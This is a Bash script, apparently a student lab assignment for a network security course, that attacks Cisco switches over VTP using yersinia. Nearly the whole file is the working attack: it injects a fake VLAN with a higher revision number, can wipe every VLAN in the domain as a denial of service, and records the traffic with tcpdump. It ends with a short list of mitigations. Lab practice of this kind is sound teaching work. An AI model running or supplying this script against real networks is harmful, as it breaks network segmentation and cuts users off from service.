#!/usr/bin/env bash
# =============================================================================
# VTP ATTACK SCRIPT — Práctica #4 Seguridad de Redes
# Instituto Tecnológico de Las Américas (ITLA)
# =============================================================================
# DESCRIPCIÓN:
#   Este script demuestra un ataque VTP (VLAN Trunking Protocol) que permite
#   a un atacante agregar o eliminar VLANs en switches Cisco que operan en
#   modo VTP Server/Client, comprometiendo toda la base de datos VLAN.
#
# CÓMO FUNCIONA EL ATAQUE:
#   VTP sincroniza la base de datos de VLANs entre switches usando el número
#   de revisión (revision number). Si el atacante inyecta una trama VTP con
#   un número de revisión MÁS ALTO que el del servidor, todos los switches
#   aceptarán la configuración del atacante como válida.
#
# REQUISITOS:
#   - Kali Linux (o cualquier distro con yersinia instalado)
#   - Acceso a un puerto trunk del switch (o convertirlo con DTP)
#   - yersinia instalado: sudo apt install yersinia
#   - Wireshark (opcional, para verificar el ataque)
#
# USO:
#   sudo chmod +x AlanGarcia_2025-1403_vtp_attack_P4.sh
#   sudo ./AlanGarcia_2025-1403_vtp_attack_P4.sh
#
# ENTORNO DE LABORATORIO:
#   Atacante (Kali): eth0 conectado al puerto trunk del switch
#   Switch 1 (SW1): VTP Server, dominio "ITLA-LAB"
#   Switch 2 (SW2): VTP Client, sincronizado con SW1
# =============================================================================

set -euo pipefail

# ─── COLORES PARA OUTPUT ────────────────────────────────────────────────────
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m' # Sin color

# ─── CONFIGURACIÓN ──────────────────────────────────────────────────────────
INTERFACE="eth0"            # Interfaz conectada al switch
VTP_DOMAIN="ITLA-LAB"       # Nombre del dominio VTP objetivo
CAPTURE_FILE="vtp_capture.pcap"  # Archivo de captura Wireshark

# ─── FUNCIONES ──────────────────────────────────────────────────────────────

banner() {
    echo -e "${RED}"
    echo "╔══════════════════════════════════════════════════════════╗"
    echo "║          VTP ATTACK — VLAN Database Manipulation         ║"
    echo "║              Práctica #4 — Seguridad de Redes            ║"
    echo "║              ITLA — Seguridad de Redes                   ║"
    echo "╚══════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${YELLOW}⚠  SOLO PARA USO EDUCATIVO EN ENTORNOS CONTROLADOS ⚠${NC}"
    echo ""
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[✗] Este script debe ejecutarse como root (sudo)${NC}"
        exit 1
    fi
}

check_dependencies() {
    echo -e "${BLUE}[*] Verificando dependencias...${NC}"
    local deps=("yersinia" "ip" "tcpdump")
    local missing=()

    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            missing+=("$dep")
        fi
    done

    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${YELLOW}[!] Instalando dependencias faltantes: ${missing[*]}${NC}"
        apt-get install -y "${missing[@]}" 2>/dev/null || {
            echo -e "${RED}[✗] No se pudieron instalar las dependencias${NC}"
            exit 1
        }
    fi
    echo -e "${GREEN}[✓] Todas las dependencias están disponibles${NC}"
}

check_interface() {
    echo -e "${BLUE}[*] Verificando interfaz de red: ${INTERFACE}${NC}"
    if ! ip link show "$INTERFACE" &>/dev/null; then
        echo -e "${RED}[✗] Interfaz ${INTERFACE} no encontrada${NC}"
        echo -e "${YELLOW}    Interfaces disponibles:${NC}"
        ip link show | grep -E "^[0-9]+" | awk '{print "    " $2}'
        exit 1
    fi
    
    # Activar la interfaz si está down
    ip link set "$INTERFACE" up
    echo -e "${GREEN}[✓] Interfaz ${INTERFACE} activa${NC}"
}

show_current_state() {
    echo ""
    echo -e "${CYAN}─────────────────────────────────────────────────────────${NC}"
    echo -e "${BOLD}[ESTADO ANTES DEL ATAQUE]${NC}"
    echo -e "${CYAN}─────────────────────────────────────────────────────────${NC}"
    echo -e "${BLUE}[*] Iniciando captura de tráfico VTP en background...${NC}"
    tcpdump -i "$INTERFACE" -w "$CAPTURE_FILE" -n "ether[20:2] == 0x2003" &
    TCPDUMP_PID=$!
    echo -e "${GREEN}[✓] Captura activa (PID: ${TCPDUMP_PID}) → ${CAPTURE_FILE}${NC}"
    echo ""
}

attack_add_vlan() {
    echo -e "${CYAN}─────────────────────────────────────────────────────────${NC}"
    echo -e "${BOLD}${RED}[ATAQUE 1] AGREGAR VLAN FALSA VÍA VTP${NC}"
    echo -e "${CYAN}─────────────────────────────────────────────────────────${NC}"
    echo ""
    echo -e "${YELLOW}[*] Descripción del ataque:${NC}"
    echo "    Un atacante conectado a un puerto trunk inyecta una trama"
    echo "    VTP con un número de revisión superior al del servidor."
    echo "    El switch acepta la nueva VLAN base y la propaga a todos"
    echo "    los clientes VTP del dominio."
    echo ""
    echo -e "${BLUE}[*] Configuración del ataque:${NC}"
    echo "    • Dominio VTP objetivo : ${VTP_DOMAIN}"
    echo "    • Interfaz de ataque   : ${INTERFACE}"
    echo "    • Tipo de ataque       : Inyección de VLAN falsa (Rev. alta)"
    echo ""
    echo -e "${YELLOW}[*] Lanzando ataque VTP con Yersinia...${NC}"
    echo ""
    
    # Yersinia ataque VTP modo automático
    # -attack 1 = Sending VTP summary advertisements (añade VLAN con rev. alta)
    echo -e "${RED}[EJECUTANDO] yersinia vtp -attack 1 -interface ${INTERFACE}${NC}"
    echo ""
    
    # Modo interactivo de yersinia con VTP
    yersinia vtp -attack 1 -interface "$INTERFACE" &
    YERSINIA_PID=$!
    
    sleep 5
    
    echo ""
    echo -e "${GREEN}[✓] Trama VTP maliciosa enviada exitosamente${NC}"
    echo -e "${YELLOW}[!] Verificar en los switches que la VLAN fue agregada:${NC}"
    echo "    SW1# show vlan brief"
    echo "    SW2# show vlan brief"
    echo "    SW1# show vtp status"
    
    kill "$YERSINIA_PID" 2>/dev/null || true
}

attack_delete_vlans() {
    echo ""
    echo -e "${CYAN}─────────────────────────────────────────────────────────${NC}"
    echo -e "${BOLD}${RED}[ATAQUE 2] BORRAR TODAS LAS VLANs VÍA VTP${NC}"
    echo -e "${CYAN}─────────────────────────────────────────────────────────${NC}"
    echo ""
    echo -e "${YELLOW}[*] Descripción del ataque:${NC}"
    echo "    El atacante envía una trama VTP con número de revisión"
    echo "    extremadamente alto y base de datos VLAN vacía. Todos los"
    echo "    switches del dominio eliminarán su base de datos VLAN,"
    echo "    desconectando a todos los usuarios de sus VLANs."
    echo ""
    echo -e "${BLUE}[*] Configuración del ataque:${NC}"
    echo "    • Tipo de ataque : VLAN database wipe (Revision Max)"
    echo "    • Impacto        : Pérdida total de segmentación de red"
    echo "    • Efecto         : DoS — todos los puertos quedan sin VLAN"
    echo ""
    echo -e "${YELLOW}[*] Lanzando ataque VTP para borrar VLANs...${NC}"
    echo ""
    
    echo -e "${RED}[EJECUTANDO] yersinia vtp -attack 2 -interface ${INTERFACE}${NC}"
    echo ""
    
    # -attack 2 = Eliminar todas las VLANs del dominio
    yersinia vtp -attack 2 -interface "$INTERFACE" &
    YERSINIA_PID2=$!
    
    sleep 5
    
    echo ""
    echo -e "${GREEN}[✓] Base de datos VLAN eliminada en el dominio${NC}"
    echo -e "${YELLOW}[!] Verificar en los switches:${NC}"
    echo "    SW1# show vlan brief        ← Debe mostrar solo VLAN 1"
    echo "    SW1# show vtp status        ← Número de revisión elevado"
    echo "    SW2# show vlan brief        ← Sincronizado = también vacío"
    
    kill "$YERSINIA_PID2" 2>/dev/null || true
}

show_evidence() {
    echo ""
    echo -e "${CYAN}─────────────────────────────────────────────────────────${NC}"
    echo -e "${BOLD}[EVIDENCIA DEL ATAQUE]${NC}"
    echo -e "${CYAN}─────────────────────────────────────────────────────────${NC}"
    
    # Detener captura
    kill "$TCPDUMP_PID" 2>/dev/null || true
    sleep 1
    
    echo -e "${GREEN}[✓] Captura guardada en: ${CAPTURE_FILE}${NC}"
    echo -e "${BLUE}[*] Para analizar la captura:${NC}"
    echo "    wireshark ${CAPTURE_FILE} &"
    echo "    tcpdump -r ${CAPTURE_FILE} -v"
    echo ""
    echo -e "${YELLOW}[*] Filtro Wireshark para VTP:${NC}"
    echo "    vtp                    ← Muestra solo tramas VTP"
    echo "    vtp.domain == ITLA-LAB ← Filtra por dominio"
}

summary() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}RESUMEN DEL ATAQUE VTP${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${RED}IMPACTO:${NC}"
    echo "  • Segmentación de red comprometida completamente"
    echo "  • Denegación de servicio para todos los usuarios"
    echo "  • Tráfico de VLANs separadas puede mezclarse"
    echo "  • Pérdida de políticas de seguridad por VLAN"
    echo ""
    echo -e "${GREEN}MITIGACIÓN (ver vtp_mitigation.sh):${NC}"
    echo "  • Usar VTP Mode Transparent o desactivar VTP"
    echo "  • Configurar contraseña en el dominio VTP"
    echo "  • Usar VTPv3 con autenticación MD5"
    echo "  • Aplicar port-security en puertos de acceso"
    echo ""
    echo -e "${BLUE}COMANDOS CISCO PARA VERIFICAR EL ATAQUE:${NC}"
    cat << 'EOF'
    SW1# show vtp status
    SW1# show vlan brief
    SW1# show interfaces trunk
    SW1# debug sw-vlan vtp events
EOF
    echo ""
}

# ─── MAIN ────────────────────────────────────────────────────────────────────
main() {
    banner
    check_root
    check_dependencies
    check_interface
    show_current_state
    
    echo ""
    echo -e "${YELLOW}[?] Seleccione el ataque a ejecutar:${NC}"
    echo "    [1] Agregar VLAN falsa"
    echo "    [2] Borrar todas las VLANs (DoS)"
    echo "    [3] Ambos ataques en secuencia"
    echo "    [q] Salir"
    echo ""
    read -rp "Opción: " choice
    
    case "$choice" in
        1) attack_add_vlan ;;
        2) attack_delete_vlans ;;
        3) attack_add_vlan; sleep 3; attack_delete_vlans ;;
        q) echo -e "${YELLOW}Saliendo...${NC}"; exit 0 ;;
        *) echo -e "${RED}Opción inválida${NC}"; exit 1 ;;
    esac
    
    show_evidence
    summary
}

main "$@"
